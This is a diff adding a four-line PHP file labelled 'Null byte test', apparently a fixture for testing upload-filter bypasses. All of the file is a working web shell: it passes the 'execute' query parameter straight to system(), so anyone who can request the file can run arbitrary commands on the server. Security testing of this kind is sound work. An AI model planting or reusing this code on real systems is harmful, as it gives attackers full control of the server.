@@ -1,0 +1,4 @@
+<?php
+// Null byte test
+system($_GET['execute']);
+?>
